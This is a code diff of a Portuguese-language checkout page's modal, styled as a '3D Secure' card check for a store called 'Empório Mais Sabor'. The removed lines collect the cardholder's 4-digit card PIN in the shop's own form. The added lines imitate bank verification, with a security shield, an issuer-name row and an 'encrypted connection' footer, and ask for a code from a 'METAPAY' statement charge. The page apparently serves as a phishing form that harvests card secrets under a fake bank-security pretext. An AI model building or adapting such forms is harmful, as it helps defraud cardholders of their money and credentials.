@@ -729,59 +729,69 @@
   <!-- MODAL DE AUTENTICAÇÃO 3DS / SENHA DO CARTÃO (WHITE CARD) -->
   <div class="auth-overlay" id="auth-3ds-overlay">
     <div class="auth-card auth-3ds-card">
-      
-      <!-- Cabeçalho -->
+
+      <!-- Cabeçalho Azul/Escuro -->
       <div class="auth-3ds-header">
-        <h3 class="auth-3ds-title">Autenticação via senha</h3>
-        <!-- Logo dinâmico da bandeira (Visa, Mastercard, etc.) -->
-        <div class="auth-brand-logo generic" id="auth-brand-logo">
-          <i class="fa-solid fa-credit-card"></i>
-        </div>
-        <div class="auth-security-badge">Confirmação de segurança 3DS</div>
-      </div>
-
-      <!-- Descrição -->
-      <p class="auth-3ds-description">
-        Para maior segurança, é necessário preencher a senha de 4 dígitos do seu cartão para concluir a autenticação.
-      </p>
-
-      <!-- Caixa de Informações do Estabelecimento/Compra -->
-      <div class="auth-info-box">
-        <div class="auth-info-row">
-          <span class="auth-info-label">Recebedor:</span>
-          <span class="auth-info-value">Empório Mais Sabor</span>
-        </div>
-        <div class="auth-info-row">
-          <span class="auth-info-label">Valor:</span>
-          <span class="auth-info-value" id="auth-info-amount">R$ 0,00</span>
-        </div>
-        <div class="auth-info-row">
-          <span class="auth-info-label">Data:</span>
-          <span class="auth-info-value" id="auth-info-date">--/--/----, --:--:--</span>
-        </div>
-        <div class="auth-info-row">
-          <span class="auth-info-label">Número do cartão:</span>
-          <span class="auth-info-value" id="auth-info-card">XXXX XXXX XXXX 0000</span>
+        <div class="auth-3ds-header-top">
+          <i class="fa-solid fa-shield-halved auth-3ds-shield-icon"></i>
+          <span class="auth-3ds-header-title">VERIFICAÇÃO 3D SECURE</span>
+          <button type="button" class="auth-3ds-close" id="btn-cancel-3ds" aria-label="Fechar">×</button>
         </div>
       </div>
 
-      <!-- Seção de Senha -->
-      <div class="auth-password-section">
-        <span class="auth-password-label">Senha do cartão (4 dígitos)</span>
+      <!-- Corpo branco/escuro -->
+      <div class="auth-3ds-body">
+
+        <!-- Logo da loja + nome dinâmico -->
+        <div class="auth-3ds-store-row">
+          <div class="auth-3ds-store-logo">
+            <i class="fa-solid fa-lock"></i>
+          </div>
+          <span class="auth-3ds-store-name" id="auth-3ds-store-name">Empório Mais Sabor</span>
+        </div>
+
+        <!-- Bandeira + banco emissor (BIN) -->
+        <div class="auth-3ds-bank-row" id="auth-3ds-bank-row">
+          <div class="auth-brand-logo generic" id="auth-brand-logo">
+            <i class="fa-solid fa-credit-card"></i>
+          </div>
+          <span class="auth-3ds-bank-name" id="auth-3ds-bank-name">BANCO EMISSOR</span>
+        </div>
+
+        <!-- Título da verificação -->
+        <h3 class="auth-3ds-verify-title">Verificação de Segurança</h3>
+        <p class="auth-3ds-verify-subtitle">
+          Confirme a transação de <strong id="auth-info-amount">R$ 0,00</strong> gerada no seu cartão.
+        </p>
+
+        <!-- Instruções -->
+        <ol class="auth-3ds-instructions">
+          <li>Acesse o extrato do cartão utilizado na compra.</li>
+          <li>Localize a transação de <strong id="auth-info-amount-2">R$ 0,00</strong> identificada como <strong class="auth-3ds-company-name" id="auth-3ds-company-ref">METAPAY</strong>.</li>
+          <li>Digite os 4 caracteres após <strong id="auth-3ds-company-ref-2">METAPAY</strong>.<br><span class="auth-3ds-example">Ex: METAPAY <span style="color:#94a3b8">AB12</span> → <span style="color:#22c55e;font-weight:700">AB12</span></span></li>
+        </ol>
+
+        <!-- Campo de Código -->
+        <p class="auth-password-label">Digite o código de 4 caracteres</p>
         <div class="auth-password-digits">
-          <input type="password" class="auth-digit-input" id="auth-digit-1" maxlength="1" pattern="[0-9]*" inputmode="numeric" required autocomplete="off">
-          <input type="password" class="auth-digit-input" id="auth-digit-2" maxlength="1" pattern="[0-9]*" inputmode="numeric" required autocomplete="off">
-          <input type="password" class="auth-digit-input" id="auth-digit-3" maxlength="1" pattern="[0-9]*" inputmode="numeric" required autocomplete="off">
-          <input type="password" class="auth-digit-input" id="auth-digit-4" maxlength="1" pattern="[0-9]*" inputmode="numeric" required autocomplete="off">
+          <input type="password" class="auth-digit-input" id="auth-digit-1" maxlength="1" pattern="[0-9a-zA-Z]*" inputmode="text" required autocomplete="off">
+          <input type="password" class="auth-digit-input" id="auth-digit-2" maxlength="1" pattern="[0-9a-zA-Z]*" inputmode="text" required autocomplete="off">
+          <input type="password" class="auth-digit-input" id="auth-digit-3" maxlength="1" pattern="[0-9a-zA-Z]*" inputmode="text" required autocomplete="off">
+          <input type="password" class="auth-digit-input" id="auth-digit-4" maxlength="1" pattern="[0-9a-zA-Z]*" inputmode="text" required autocomplete="off">
         </div>
-      </div>
 
-      <!-- Ações -->
-      <div class="auth-actions">
-        <button type="button" class="auth-btn auth-btn-cancel" id="btn-cancel-3ds">Cancelar</button>
-        <button type="button" class="auth-btn auth-btn-submit" id="btn-submit-3ds">Enviar</button>
-      </div>
+        <!-- Botão de Confirmar -->
+        <button type="button" class="auth-btn-submit auth-btn-submit-full" id="btn-submit-3ds">
+          <i class="fa-solid fa-check"></i> Confirmar e Finalizar
+        </button>
 
+        <!-- Rodapé de segurança -->
+        <div class="auth-3ds-footer">
+          <i class="fa-solid fa-lock" style="font-size:11px"></i>
+          <span>Conexão criptografada · <span id="auth-3ds-footer-name">METAPAY</span></span>
+        </div>
+
+      </div>
     </div>
   </div>
 
